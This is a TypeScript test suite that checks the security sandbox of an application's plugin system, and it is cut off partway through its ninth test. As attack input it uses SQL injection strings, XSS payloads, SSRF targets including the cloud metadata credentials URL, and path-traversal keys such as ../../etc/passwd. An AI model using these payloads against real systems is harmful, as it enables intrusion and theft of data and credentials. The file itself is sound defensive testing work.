import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import Database from 'better-sqlite3';
import { Linter } from 'eslint';
import { Hono } from 'hono';
import tseslint from 'typescript-eslint';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { z } from 'zod';
import {
  formatPluginConsentSummary,
  sanitizePluginHtml,
  sanitizePluginProps,
  type BurrowServerPlugin,
  type PluginManifest,
} from '@burrow/sdk';
import burrowEslintPlugin, { recommendedRules } from '../../packages/eslint-plugin/src/index.js';
import {
  PluginEventBus,
  PluginNetworkAccessError,
  PluginRuntimeRegistry,
  PluginSqlAccessError,
  PluginStorageError,
  assertPluginSqlAllowed,
  createCoreApp,
  createPluginDb,
  createPluginFetch,
  createPluginLogger,
  createPluginStorage,
  redactSecrets,
  runPluginMigrations,
  splitPluginSqlStatements,
  type Infrastructure,
} from '../../src/core';
import type { IStorageAdapter } from '../../src/core/adapters/storage';
import { SelfHostedPolicy } from '../../src/core/policy';
import { validatePluginDirectory } from '../../scripts/plugin-validate.mjs';

const tmpDirs: string[] = [];

function createTempDir(prefix = 'burrow-audit-test-'): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  tmpDirs.push(dir);
  return dir;
}

function createTempSqlite(): Database.Database {
  const dir = createTempDir();
  return new Database(path.join(dir, 'audit.sqlite'));
}

function createStubInfra(
  sqlite: Database.Database,
  overrides: {
    userId?: string | null;
    userRoleByWs?: Record<string, 'owner' | 'editor' | 'viewer'>;
    notepadWsMap?: Record<string, string>;
    env?: Record<string, unknown>;
    storage?: IStorageAdapter;
    listOwnedWorkspaces?: Array<{ id: string; role: 'owner' | 'editor' | 'viewer' }>;
  } = {},
): Infrastructure {
  const roleMap = overrides.userRoleByWs ?? { ws_1: 'editor' };
  const notepadWsMap = overrides.notepadWsMap ?? { np_owned: 'ws_1', np_victim: 'ws_other' };

  return {
    repositories: {
      workspaces: {
        listByUser: vi.fn().mockResolvedValue(
          overrides.listOwnedWorkspaces ?? [
            { id: 'ws_1', name: 'Workspace One', slug: 'ws-1', role: roleMap.ws_1 ?? 'editor' },
          ],
        ),
        count: vi.fn().mockResolvedValue(1),
        findById: vi.fn().mockImplementation(async (id: string) => ({ id, name: id, slug: id })),
        isInstanceOwner: vi.fn().mockImplementation(async (uid: string) => uid === 'u_owner'),
      } as any,
      members: {
        findByUserId: vi.fn().mockImplementation(async (wsId: string, userId: string) => {
          if (!overrides.userId || userId !== overrides.userId) return null;
          const role = roleMap[wsId];
          return role ? { workspaceId: wsId, userId, role } : null;
        }),
      } as any,
      projects: {} as any,
      notepads: {
        findById: vi.fn().mockImplementation(async (wsId: string, id: string) => {
          return notepadWsMap[id] === wsId ? { id, workspaceId: wsId, title: 'Note' } : null;
        }),
        findByIdInScope: vi.fn().mockImplementation(async (scope: { workspaceId: string }, id: string) => {
          return notepadWsMap[id] === scope.workspaceId
            ? { id, workspaceId: scope.workspaceId, title: 'Note' }
            : null;
        }),
      } as any,
      projectFiles: {} as any,
      boards: {} as any,
      cards: {} as any,
      tags: {} as any,
      notifications: {} as any,
      invites: {} as any,
    },
    storage:
      overrides.storage ??
      ({
        put: vi.fn().mockResolvedValue(undefined),
        get: vi.fn().mockResolvedValue(null),
        delete: vi.fn().mockResolvedValue(undefined),
        list: vi.fn().mockResolvedValue([]),
      } as unknown as IStorageAdapter),
    search: {} as any,
    locks: {} as any,
    auth: {
      getSession: vi.fn().mockImplementation(async () =>
        overrides.userId
          ? {
              userId: overrides.userId,
              email: `${overrides.userId}@example.com`,
              name: 'User',
            }
          : null,
      ),
      handler: vi.fn().mockResolvedValue(new Response('ok')),
    },
    email: { provider: 'console', send: vi.fn() },
    bootstrapToken: '',
    env: overrides.env ?? {},
    db: sqlite as any,
  };
}

function createMemoryStorage(): IStorageAdapter & { files: Map<string, { body: Uint8Array; contentType?: string }> } {
  const files = new Map<string, { body: Uint8Array; contentType?: string }>();
  return {
    files,
    async put(key, data, contentType) {
      const bytes =
        typeof data === 'string'
          ? new TextEncoder().encode(data)
          : data instanceof ArrayBuffer
            ? new Uint8Array(data)
            : new Uint8Array(data);
      files.set(key, { body: bytes, contentType });
    },
    async get(key) {
      const item = files.get(key);
      return item ? { body: item.body, contentType: item.contentType, contentLength: item.body.byteLength } : null;
    },
    async delete(key) {
      files.delete(key);
    },
    async deletePrefix(prefix) {
      for (const key of [...files.keys()]) {
        if (key.startsWith(prefix)) files.delete(key);
      }
    },
    async listObjects(prefix) {
      return [...files.keys()].filter((k) => !prefix || k.startsWith(prefix));
    },
  };
}

afterEach(() => {
  for (const dir of tmpDirs.splice(0)) {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

describe('Phase A+ Safe-by-Default Plugin Security Verification Suite', () => {
  it('1. SQL Injection: blocks lexer desync, dollar-quoting, SELECT INTO, MERGE, UNION, unparameterized WHERE literals, and multi-statements; allows sql`` + db.table()', async () => {
    const sqlite = createTempSqlite();
    try {
      sqlite.exec(`
        CREATE TABLE workspaces (id TEXT PRIMARY KEY, name TEXT NOT NULL);
        INSERT INTO workspaces (id, name) VALUES ('ws_1', 'Workspace One');
        CREATE TABLE plugin_safe_items (id TEXT PRIMARY KEY, workspace_id TEXT NOT NULL, title TEXT NOT NULL);
      `);
      const db = createPluginDb(sqlite, 'safe', { coreTables: ['workspaces'] });

      // Double-quoted identifier containing an apostrophe must not desync lexer (both literal and bound variants)
      await expect(
        db.execute(`WITH cte AS (SELECT 1 AS "a'b") DELETE FROM workspaces WHERE 'x' = 'x'`),
      ).rejects.toThrow(PluginSqlAccessError);
      await expect(
        db.execute(`WITH cte AS (SELECT 1 AS "a'b") DELETE FROM workspaces WHERE id = ?`, ['ws_1']),
      ).rejects.toThrow(PluginSqlAccessError);

      // Postgres dollar quotes blocked unconditionally even without runtime flags or unprefixed targets
      expect(() =>
        assertPluginSqlAllowed('safe', `WITH cte AS (SELECT $$a'b$$) DELETE FROM workspaces WHERE '1' = '1'`, 'plugin_safe_'),
      ).toThrow(PluginSqlAccessError);
      expect(() =>
        assertPluginSqlAllowed('safe', `SELECT $$dollar$$ FROM plugin_safe_items`, 'plugin_safe_'),
      ).toThrow(PluginSqlAccessError);
      expect(splitPluginSqlStatements('SELECT $$; DELETE FROM workspaces; $$')).toHaveLength(1);

      // Tautological WHERE without bound parameters on core tables rejected by SQLite tripwire
      await expect(db.query('SELECT id FROM workspaces WHERE 1 = 1')).rejects.toThrow(PluginSqlAccessError);

      // SELECT INTO and WITH MERGE INTO blocked
      expect(() => assertPluginSqlAllowed('safe', 'SELECT * INTO unprefixed_tbl FROM workspaces', 'plugin_safe_')).toThrow(
        PluginSqlAccessError,
      );
      expect(() =>
        assertPluginSqlAllowed(
          'safe',
          'WITH src AS (SELECT 1 AS id) MERGE INTO workspaces t USING src s ON t.id = s.id WHEN MATCHED THEN DELETE',
          'plugin_safe_',
        ),
      ).toThrow(PluginSqlAccessError);

      // Multi-statement, comments, UNION SELECT, and unparameterized WHERE string literals blocked
      await expect(db.query('SELECT * FROM plugin_safe_items; DROP TABLE workspaces')).rejects.toThrow(
        PluginSqlAccessError,
      );
      await expect(db.query('SELECT * FROM plugin_safe_items -- comment bypass')).rejects.toThrow(
        PluginSqlAccessError,
      );
      await expect(db.query('SELECT id FROM plugin_safe_items UNION SELECT email FROM user')).rejects.toThrow(
        PluginSqlAccessError,
      );
      await expect(db.query("SELECT id FROM plugin_safe_items WHERE id = '1' OR '1'='1'")).rejects.toThrow(
        PluginSqlAccessError,
      );

      // Core table integrity preserved
      expect(sqlite.prepare('SELECT id FROM workspaces').all()).toEqual([{ id: 'ws_1' }]);

      // Safe parameterized path + sql`` + db.table() works
      const tbl = db.table('items');
      expect(tbl.value).toBe('plugin_safe_items');
      await db.execute(
        db.sql`INSERT INTO ${tbl} (id, workspace_id, title) VALUES (${'item_1'}, ${'ws_1'}, ${"O'Reilly Safe"})`,
      );
      const found = await db.query<{ id: string; title: string }>(
        db.sql`SELECT id, title FROM ${tbl} WHERE workspace_id = ${'ws_1'}`,
      );
      expect(found).toEqual([{ id: 'item_1', title: "O'Reilly Safe" }]);
    } finally {
      sqlite.close();
    }
  });

  it('2. XSS & CSP: sanitizePluginHtml and sanitizePluginProps strip executable payloads and core keeps strict CSP headers', async () => {
    const dirtyHtml =
      '<p onclick="alert(1)">Hello</p><script>steal()</script><iframe src="https://evil.test"></iframe>' +
      '<svg onload="alert(2)"></svg><a href="javascript:alert(3)" target="_blank">bad</a>' +
      '<a href="https://docs.example.com" target="_blank">good</a><img src="data:text/html,<script>" onerror="x()" />';
    const clean = sanitizePluginHtml(dirtyHtml);
    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('<iframe');
    expect(clean).not.toContain('<svg');
    expect(clean).not.toContain('javascript:');
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('data:text/html');
    expect(clean).toContain('<p>Hello</p>');
    expect(clean).toContain('href="https://docs.example.com"');
    expect(clean).toContain('rel="noopener noreferrer"');

    const sanitizedProps = sanitizePluginProps({
      id: 'item_1',
      label: 'Label',
      badUrl: 'javascript:alert(1)',
      badData: 'DATA:text/html,<script>x</script>',
      nested: { noteHtml: 'vbscript:msgbox(1)', ok: 'safe' },
    });
    expect(sanitizedProps.badUrl).toBe('');
    expect(sanitizedProps.badData).toBe('');
    expect((sanitizedProps.nested as Record<string, string>).noteHtml).toBe('');
    expect((sanitizedProps.nested as Record<string, string>).ok).toBe('safe');

    // Plugin attempting to loosen CSP header is overridden by core strict securityHeaders
    const sqlite = createTempSqlite();
    try {
      const cspPlugin: BurrowServerPlugin = {
        manifest: {
          id: 'csp-probe',
          version: '0.1.0',
          sdkVersion: '^0.4.0',
          permissions: ['routes:api', 'routes:public'],
          dialects: ['sqlite'],
        },
        setup(ctx) {
          ctx.defineRoute({
            method: 'GET',
            path: '/try-loosen',
            public: true,
            schemas: {},
            handler(c: any) {
              c.header('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'");
              return c.json({ ok: true });
            },
          });
        },
      };

      const app = createCoreApp(createStubInfra(sqlite), {
        policy: new SelfHostedPolicy(),
        plugins: [cspPlugin],
        rawDb: sqlite,
      });

      const res = await app.request('http://localhost/api/plugins/csp-probe/try-loosen');
      expect(res.status).toBe(200);
      const csp = res.headers.get('Content-Security-Policy') ?? '';
      const scriptSrc =
        csp
          .split(';')
          .map((s) => s.trim())
          .find((s) => s.startsWith('script-src')) ?? '';
      expect(scriptSrc).toBe("script-src 'self'");
      expect(scriptSrc).not.toContain("'unsafe-eval'");
      expect(scriptSrc).not.toContain("'unsafe-inline'");
      expect(csp).not.toContain('default-src *');
    } finally {
      sqlite.close();
    }
  });

  it('3. SSRF & Egress: ctx.fetch blocks private/loopback/metadata IPs, DNS rebinding, unsafe redirects, oversized payloads, and undeclared hosts', async () => {
    const manifest: PluginManifest = {
      id: 'egress',
      version: '0.1.0',
      sdkVersion: '^0.4.0',
      permissions: [],
      network: ['api.example.com', 'rebind.example.org'],
    };

    const mockFetch = vi.fn(async (input: string | URL | Request) => {
      const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      if (url.includes('/redirect-meta')) {
        return new Response(null, {
          status: 302,
          headers: { location: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
        });
      }
      if (url.includes('/huge')) {
        return new Response('x'.repeat(2048), {
          status: 200,
          headers: { 'content-length': '2048' },
        });
      }
      return new Response(JSON.stringify({ ok: true }), { status: 200 });
    });

    const safeFetch = createPluginFetch(manifest, {
      fetchImpl: mockFetch as unknown as typeof fetch,
      maxResponseBytes: 512,
      resolveHostIps: async (host) => {
        if (host === 'rebind.example.org') return ['10.20.30.40'];
        return ['93.184.216.34'];
      },
    });

    // Undeclared host rejected
    await expect(safeFetch('https://evil.example.net/hook')).rejects.toThrow(PluginNetworkAccessError);

    // Loopback, private, link-local, metadata, IPv6 loopback/ULA, mapped IPv6, integer IP, nip.io all rejected
    const ssrfTargets = [
      'http://127.0.0.1/admin',
      'http://10.0.0.1/internal',
      'http://172.16.5.4/internal',
      'http://192.168.1.1/router',
      'http://169.254.169.254/latest/meta-data/',
      'http://[::1]:8080/',
      'http://[fc00::1]/',
      'http://[::ffff:127.0.0.1]/',
      'http://2130706433/',
      'http://127.0.0.1.nip.io/',
      'https://rebind.example.org/secret',
    ];
    for (const target of ssrfTargets) {
      await expect(safeFetch(target)).rejects.toThrow(PluginNetworkAccessError);
    }

    // Redirect to AWS metadata blocked before second request fires
    await expect(safeFetch('https://api.example.com/redirect-meta')).rejects.toThrow(PluginNetworkAccessError);
    expect(mockFetch).toHaveBeenCalledTimes(1);

    // Oversized response rejected
    await expect(safeFetch('https://api.example.com/huge')).rejects.toThrow(PluginNetworkAccessError);

    // Allowlisted public endpoint succeeds
    const okRes = await safeFetch('https://api.example.com/v1/status');
    expect(okRes.status).toBe(200);
    expect(await okRes.json()).toEqual({ ok: true });
  });

  it('4. Authz, IDOR & Table Isolation: default-deny routes, requireRole, requireWorkspaceAccess, stripped env/infra, and scoped DB views', async () => {
    const sqlite = createTempSqlite();
    try {
      sqlite.exec(`
        CREATE TABLE _worker_runtime_config (key TEXT PRIMARY KEY, value TEXT NOT NULL);
        INSERT INTO _worker_runtime_config (key, value) VALUES ('better_auth_secret', 'master-secret');
        CREATE TABLE user (id TEXT PRIMARY KEY, email TEXT NOT NULL);
        INSERT INTO user (id, email) VALUES ('u1', 'victim@example.com');
        CREATE TABLE session (id TEXT PRIMARY KEY, token TEXT NOT NULL);
        INSERT INTO session (id, token) VALUES ('s1', 'tok_secret');
        CREATE TABLE invites (id TEXT PRIMARY KEY, workspace_id TEXT NOT NULL, email TEXT NOT NULL, token_hash TEXT NOT NULL);
        INSERT INTO invites (id, workspace_id, email, token_hash) VALUES ('inv1', 'ws_1', 'a@b.com', 'hash_secret');
        CREATE TABLE workspaces (id TEXT PRIMARY KEY, name TEXT NOT NULL);
        INSERT INTO workspaces (id, name) VALUES ('ws_1', 'W1'), ('ws_2', 'W2');
        CREATE TABLE plugin_other_secrets (id TEXT PRIMARY KEY, secret TEXT NOT NULL);
        INSERT INTO plugin_other_secrets (id, secret) VALUES ('1', 'other_plugin_val');
      `);

      let capturedEnv: Record<string, unknown> = { unexpected: true };
      let capturedInfra: unknown = { unexpected: true };

      const authzPlugin: BurrowServerPlugin = {
        manifest: {
          id: 'authz-check',
          version: '0.1.0',
          sdkVersion: '^0.4.0',
          permissions: ['db:own', 'routes:api'],
          dialects: ['sqlite'],
        },
        migrations: [
          {
            name: '0001_init.sql',
            sql: 'CREATE TABLE IF NOT EXISTS plugin_authz_check_notes (id TEXT PRIMARY KEY, workspace_id TEXT NOT NULL);',
          },
        ],
        setup(ctx) {
          capturedEnv = ctx.env;
          capturedInfra = ctx.infra;
          // Attempt arbitrary mountPath override -> ignored/forced to /api/plugins/authz-check
          ctx.defineRoute({
            method: 'POST',
            path: '/workspaces/:wid/notepads/:nid',
            workspaceParam: 'wid',
            minRole: 'editor',
            schemas: {
              params: z.object({ wid: z.string(), nid: z.string() }),
            },
            async handler(c: any, { params }) {
              await ctx.requireWorkspaceAccess(c, {
                kind: 'notepad',
                id: params.nid,
                workspaceId: params.wid,
              });
              return c.json({ allowed: true });
            },
          });
        },
      };

      const plugins = [authzPlugin];
      await runPluginMigrations(sqlite, plugins);

      // Anonymous app denies plugin route with 401
      const anonApp = createCoreApp(
        createStubInfra(sqlite, { userId: null, env: { BETTER_AUTH_SECRET: 'super-secret-value' } }),
        { policy: new SelfHostedPolicy(), plugins, rawDb: sqlite },
      );
      expect(capturedEnv).toEqual({});
      expect(capturedInfra).toBeUndefined();
      expect(
        (await anonApp.request('http://localhost/api/plugins/authz-check/workspaces/ws_1/notepads/np_owned', {
          method: 'POST',
        })).status,
      ).toBe(401);

      // Viewer role denied by minRole: 'editor' (403)
      const viewerApp = createCoreApp(
        createStubInfra(sqlite, { userId: 'u_viewer', userRoleByWs: { ws_1: 'viewer' } }),
        { policy: new SelfHostedPolicy(), plugins, rawDb: sqlite },
      );
      expect(
        (await viewerApp.request('http://localhost/api/plugins/authz-check/workspaces/ws_1/notepads/np_owned', {
          method: 'POST',
        })).status,
      ).toBe(403);

      // Editor in ws_1 probing cross-workspace resource np_victim blocked by requireWorkspaceAccess (404)
      const editorApp = createCoreApp(
        createStubInfra(sqlite, { userId: 'u_editor', userRoleByWs: { ws_1: 'editor' } }),
        { policy: new SelfHostedPolicy(), plugins, rawDb: sqlite },
      );
      expect(
        (await editorApp.request('http://localhost/api/plugins/authz-check/workspaces/ws_1/notepads/np_victim', {
          method: 'POST',
        })).status,
      ).toBe(404);
      expect(
        (await editorApp.request('http://localhost/api/plugins/authz-check/workspaces/ws_1/notepads/np_owned', {
          method: 'POST',
        })).status,
      ).toBe(200);

      // PluginDb blocks auth/config tables, token_hash, other plugins, undeclared core tables, and unscoped core reads
      const db = createPluginDb(sqlite, 'authz-check', { coreTables: [] });
      await expect(db.query('SELECT value FROM _worker_runtime_config WHERE key = ?', ['better_auth_secret'])).rejects.toThrow(PluginSqlAccessError);
      await expect(db.query('SELECT email FROM user WHERE id = ?', ['u1'])).rejects.toThrow(PluginSqlAccessError);
      await expect(db.query('SELECT token FROM session WHERE id = ?', ['s1'])).rejects.toThrow(PluginSqlAccessError);
      await expect(db.query('SELECT token_hash FROM invites WHERE workspace_id = ?', ['ws_1'])).rejects.toThrow(PluginSqlAccessError);
      await expect(db.query('SELECT secret FROM plugin_other_secrets')).rejects.toThrow(PluginSqlAccessError);
      await expect(db.query('SELECT id FROM workspaces')).rejects.toThrow(PluginSqlAccessError);
      await expect(db.query('SELECT id FROM workspaces WHERE id = ?', ['ws_1'])).rejects.toThrow(PluginSqlAccessError);

      // Restored c661369 probe #2: permissions: [] plugin cannot access BETTER_AUTH_SECRET, ctx.infra, db, route, or storage
      let zeroPermEnvSecret: unknown = 'unexpected';
      let zeroPermInfra: unknown = 'unexpected';
      let zeroPermDbThrew = false;
      let zeroPermRouteThrew = false;
      const zeroPermPlugin: BurrowServerPlugin = {
        manifest: {
          id: 'zero-perm',
          version: '0.1.0',
          sdkVersion: '^0.4.0',
          permissions: [],
        },
        setup(ctx) {
          zeroPermEnvSecret = ctx.env.BETTER_AUTH_SECRET;
          zeroPermInfra = ctx.infra;
          try {
            ctx.route(new Hono());
          } catch {
            zeroPermRouteThrew = true;
          }
          try {
            void ctx.db.query('SELECT 1');
          } catch {
            zeroPermDbThrew = true;
          }
        },
      };
      createCoreApp(
        createStubInfra(sqlite, { env: { BETTER_AUTH_SECRET: 'leaked-master-secret-32-bytes!!!!' } }),
        { policy: new SelfHostedPolicy(), plugins: [zeroPermPlugin], rawDb: sqlite },
      );
      expect(zeroPermEnvSecret).toBeUndefined();
      expect(zeroPermInfra).toBeUndefined();
      expect(zeroPermRouteThrew).toBe(true);
      expect(zeroPermDbThrew).toBe(true);

      // Restored c661369 probe #3: custom mountPath override rejected AND default ctx.route(router) requires authentication (401)
      const arbitraryMountPlugin: BurrowServerPlugin = {
        manifest: {
          id: 'arbitrary-mount',
          version: '0.1.0',
          sdkVersion: '^0.4.0',
          permissions: ['routes:api'],
        },
        setup(ctx) {
          const router = new Hono();
          router.get('/open', (c) => c.json({ ok: true }));
          ctx.route(router, { mountPath: '/api/arbitrary-root' });
        },
      };
      expect(() =>
        createCoreApp(createStubInfra(sqlite), {
          policy: new SelfHostedPolicy(),
          plugins: [arbitraryMountPlugin],
          rawDb: sqlite,
        }),
      ).toThrow(/cannot override mountPath/);

      const defaultDenyRawRoutePlugin: BurrowServerPlugin = {
        manifest: {
          id: 'raw-route-deny',
          version: '0.1.0',
          sdkVersion: '^0.4.0',
          permissions: ['routes:api'],
        },
        setup(ctx) {
          const router = new Hono();
          router.get('/open', (c) => c.json({ ok: true }));
          ctx.route(router);
        },
      };
      const rawRouteApp = createCoreApp(createStubInfra(sqlite, { userId: null }), {
        policy: new SelfHostedPolicy(),
        plugins: [defaultDenyRawRoutePlugin],
        rawDb: sqlite,
      });
      expect((await rawRouteApp.request('http://localhost/api/plugins/raw-route-deny/open')).status).toBe(401);
    } finally {
      sqlite.close();
    }
  });

  it('5. CSRF, CORS & GET-Write Lock: inherits CSRF rejection, strips untrusted CORS headers, and blocks DB writes inside GET handlers', async () => {
    const sqlite = createTempSqlite();
    try {
      const csrfPlugin: BurrowServerPlugin = {
        manifest: {
          id: 'csrf-probe',
          version: '0.1.0',
          sdkVersion: '^0.4.0',
          permissions: ['db:own', 'routes:api', 'routes:public'],
          dialects: ['sqlite'],
        },
        migrations: [
          { name: '0001_init.sql', sql: 'CREATE TABLE IF NOT EXISTS plugin_csrf_probe_logs (id TEXT PRIMARY KEY);' },
        ],
        setup(ctx) {
          ctx.defineRoute({
            method: 'GET',
            path: '/bad-get-write',
            public: true,
            schemas: {},
            async handler(c: any) {
              // Attempted state change inside GET must be blocked by PluginDb
              await ctx.db.execute('INSERT INTO plugin_csrf_probe_logs (id) VALUES (?)', ['row_1']);
              return c.json({ ok: true });
            },
          });
          ctx.defineRoute({
            method: 'POST',
            path: '/mutate',
            schemas: { body: z.object({ ok: z.boolean() }) },
            handler(c: any) {
              c.header('Access-Control-Allow-Origin', 'https://evil.example');
              return c.json({ mutated: true });
            },
          });
        },
      };

      await runPluginMigrations(sqlite, [csrfPlugin]);
      const app = createCoreApp(createStubInfra(sqlite, { userId: 'u_editor' }), {
        policy: new SelfHostedPolicy(),
        plugins: [csrfPlugin],
        rawDb: sqlite,
      });

      // GET writing to PluginDb is caught and returns 500 without committing any row
      const getWriteRes = await app.request('http://localhost/api/plugins/csrf-probe/bad-get-write');
      expect(getWriteRes.status).toBe(500);
      expect(sqlite.prepare('SELECT id FROM plugin_csrf_probe_logs').all()).toEqual([]);

      // Cross-site POST blocked by core CSRF protection (403)
      const csrfCrossSite = await app.request('http://localhost/api/plugins/csrf-probe/mutate', {
        method: 'POST',
        headers: {
          Host: 'localhost',
          Origin: 'https://evil.example',
          'Sec-Fetch-Site': 'cross-site',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ ok: true }),
      });
      expect(csrfCrossSite.status).toBe(403);

      // Same-origin POST strips injected permissive CORS header
      const sameOrigin = await app.request('http://localhost/api/plugins/csrf-probe/mutate', {
        method: 'POST',
        headers: {
          Host: 'localhost',
          Origin: 'http://localhost',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ ok: true }),
      });
      expect(sameOrigin.status).toBe(200);
      expect(sameOrigin.headers.get('Access-Control-Allow-Origin')).toBeNull();
    } finally {
      sqlite.close();
    }
  });

  it('6. Input Validation: ctx.defineRoute enforces Zod schemas (params, query, body) and plugin:validate rejects unvalidated mutable routes', async () => {
    const sqlite = createTempSqlite();
    try {
      const valPlugin: BurrowServerPlugin = {
        manifest: {
          id: 'validated',
          version: '0.1.0',
          sdkVersion: '^0.4.0',
          permissions: ['routes:api'],
          dialects: ['sqlite'],
        },
        setup(ctx) {
          ctx.defineRoute({
            method: 'POST',
            path: '/workspaces/:wid/items/:itemId',
            workspaceParam: 'wid',
            minRole: 'editor',
            schemas: {
              params: z.object({ wid: z.string().min(1), itemId: z.string().regex(/^item_\d+$/) }),
              query: z.object({ dryRun: z.enum(['true', 'false']).optional() }),
              body: z.object({ count: z.number().int().min(1).max(10) }),
            },
            handler(c: any, { params, query, body }) {
              return c.json({ params, query, body });
            },
          });
        },
      };

      const app = createCoreApp(createStubInfra(sqlite, { userId: 'u_editor' }), {
        policy: new SelfHostedPolicy(),
        plugins: [valPlugin],
        rawDb: sqlite,
      });

      const badBody = await app.request(
        'http://localhost/api/plugins/validated/workspaces/ws_1/items/item_1',
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ count: 999 }),
        },
      );
      expect(badBody.status).toBe(400);

      const badParam = await app.request(
        'http://localhost/api/plugins/validated/workspaces/ws_1/items/not-valid',
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ count: 2 }),
        },
      );
      expect(badParam.status).toBe(400);

      const good = await app.request(
        'http://localhost/api/plugins/validated/workspaces/ws_1/items/item_7?dryRun=true',
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ count: 3 }),
        },
      );
      expect(good.status).toBe(200);
      expect(await good.json()).toEqual({
        params: { wid: 'ws_1', itemId: 'item_7' },
        query: { dryRun: 'true' },
        body: { count: 3 },
      });

      // Unvalidated Hono POST route without defineRoute/zValidator fails plugin:validate
      const unvalidatedDir = createTempDir('burrow-unval-');
      fs.writeFileSync(
        path.join(unvalidatedDir, 'package.json'),
        JSON.stringify({ name: 'unval-plugin', version: '0.1.0', license: 'MIT', dependencies: {} }),
      );
      fs.writeFileSync(
        path.join(unvalidatedDir, 'index.ts'),
        `import { Hono } from 'hono';\nexport function setup(ctx: any) { const r = new Hono(); r.post('/items', async (c) => c.json(await c.req.json())); ctx.route(r); }\n`,
      );
      const valResult = validatePluginDirectory(unvalidatedDir);
      expect(valResult.ok).toBe(false);
      expect(valResult.findings.some((f: { rule: string }) => f.rule === 'unvalidated-route')).toBe(true);
    } finally {
      sqlite.close();
    }
  });

  it('7. Path Traversal & Uploads: ctx.storage prefixes plugins/<id>/, blocks traversal/null bytes/oversized/XSS content types', async () => {
    const adapter = createMemoryStorage();
    const storage = createPluginStorage('notes-ext', adapter, { maxUploadBytes: 64 });

    const traversalKeys = [
      '../other-plugin/secret.json',
      '..\\..\\etc\\passwd',
      '/etc/passwd',
      'C:\\Windows\\win.ini',
      '%2e%2e/escape.json',
      'dir/\0null.txt',
      'a//b.txt',
    ];
    for (const badKey of traversalKeys) {
      await expect(storage.put(badKey, 'data', 'text/plain')).rejects.toThrow(PluginStorageError);
      await expect(storage.get(badKey)).rejects.toThrow(PluginStorageError);
      await expect(storage.delete(badKey)).rejects.toThrow(PluginStorageError);
    }

    // Active script/HTML/SVG MIME types rejected
    await expect(storage.put('avatar.svg', '<svg/>', 'image/svg+xml')).rejects.toThrow(PluginStorageError);
    await expect(storage.put('page.html', '<script/>', 'text/html; charset=utf-8')).rejects.toThrow(
      PluginStorageError,
    );
    await expect(storage.put('code.js', 'alert(1)', 'application/javascript')).rejects.toThrow(PluginStorageError);

    // Oversized upload rejected
    await expect(storage.put('big.txt', 'a'.repeat(128), 'text/plain')).rejects.toThrow(PluginStorageError);

    // Safe relative key stored strictly under plugins/notes-ext/
    await storage.put('exports/report.json', JSON.stringify({ ok: true }), 'application/json');
    expect(adapter.files.has('plugins/notes-ext/exports/report.json')).toBe(true);
    expect(await storage.list()).toEqual(['exports/report.json']);
  });

  it('8. Secrets & Log Redaction: ctx.config exposes only declared keys; ctx.log and error responses redact secrets', async () => {
    const sqlite = createTempSqlite();
    try {
      let sawMasterSecret: unknown = 'unset';
      let sawWebhookSecret: unknown = 'unset';
      const spyError = vi.spyOn(console, 'error').mockImplementation(() => {});

      const secretPlugin: BurrowServerPlugin = {
        manifest: {
          id: 'secret-scope',
          version: '0.1.0',
          sdkVersion: '^0.4.0',
          permissions: ['routes:public'],
          configKeys: ['WEBHOOK_SIGNING_KEY'],
          dialects: ['sqlite'],
        },
        setup(ctx) {
          sawMasterSecret = ctx.config.BETTER_AUTH_SECRET;
          sawWebhookSecret = ctx.config.WEBHOOK_SIGNING_KEY;
          ctx.defineRoute({
            method: 'GET',
            path: '/boom',
            public: true,
            schemas: {},
            handler() {
              ctx.log.error('Signing failed', { leaked: 'whsec_super_secret_123', master: 'auth_master_key_xyz' });
              throw new Error('Upstream error with secret whsec_super_secret_123');
            },
          });
        },
      };

      const app = createCoreApp(
        createStubInfra(sqlite, {
          env: {
            BETTER_AUTH_SECRET: 'auth_master_key_xyz',
            WEBHOOK_SIGNING_KEY: 'whsec_super_secret_123',
            DATABASE_URL: 'postgres://user:pass@localhost/db',
          },
        }),
        { policy: new SelfHostedPolicy(), plugins: [secretPlugin], rawDb: sqlite },
      );

      expect(sawMasterSecret).toBeUndefined();
      expect(sawWebhookSecret).toBe('whsec_super_secret_123');

      const res = await app.request('http://localhost/api/plugins/secret-scope/boom');
      expect(res.status).toBe(500);
      const bodyText = await res.text();
      expect(bodyText).not.toContain('whsec_super_secret_123');
      expect(bodyText).not.toContain('auth_master_key_xyz');

      const loggedText = spyError.mock.calls.flat().map((v) => String(v)).join('\n');
      expect(loggedText).toContain('[REDACTED]');
      expect(loggedText).not.toContain('whsec_super_secret_123');
      expect(loggedText).not.toContain('auth_master_key_xyz');
      expect(redactSecrets('key=whsec_super_secret_123', ['whsec_super_secret_123'])).toBe('key=[REDACTED]');

      const directLogger = createPluginLogger('unit-log', ['top_secret_token_99']);
      directLogger.warn('Failed with top_secret_token_99');
      spyError.mockRestore();
    } finally {
      sqlite.close();
    }
  });

  it('9. Resource Abuse & Kill Switch: enforces handler timeouts (504), rate limits (429), DB row limits, non-blocking emitAfter, PLUGINS_DISABLED / DISABLED_PLUGINS, and /api/plugins toggle consent', async () => {
    const sqlite = createTempSqlite();
    try {
      sqlite.exec('CREATE TABLE plugin_quota_rows (id TEXT PRIMARY KEY);');
      const insertStmt = sqlite.prepare('INSERT INTO plugin_quota_rows (id) VALUES (?)');
      for (let i = 0; i < 20; i++) insertStmt.run(`r_${i}`);

      const quotaDb = createPluginDb(sqlite, 'quota');
      const cappedRows = await quotaDb.query('SELECT id FROM plugin_quota_rows', [], { maxRows: 5 });
      expect(cappedRows).toHaveLength(5);

      const registry = new PluginRuntimeRegistry();
      const quotaPlugin: BurrowServerPlugin = {
        manifest: {
          id: 'quota',
          name: 'Quota Test Plugin',
          version: '0.1.0',
          sdkVersion: '^0.4.0',
